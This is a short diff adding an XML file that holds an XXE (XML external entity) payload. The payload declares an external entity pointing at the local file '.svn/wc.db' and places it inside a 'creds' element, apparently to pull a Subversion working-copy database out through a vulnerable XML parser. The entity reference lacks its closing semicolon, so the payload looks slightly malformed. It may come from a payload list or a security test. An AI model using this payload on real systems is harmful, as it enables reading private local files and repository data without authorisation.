@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+ <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY file SYSTEM "file:////.svn/wc.db" >]>
+<creds>
+  <text>&file</text>
+</creds>
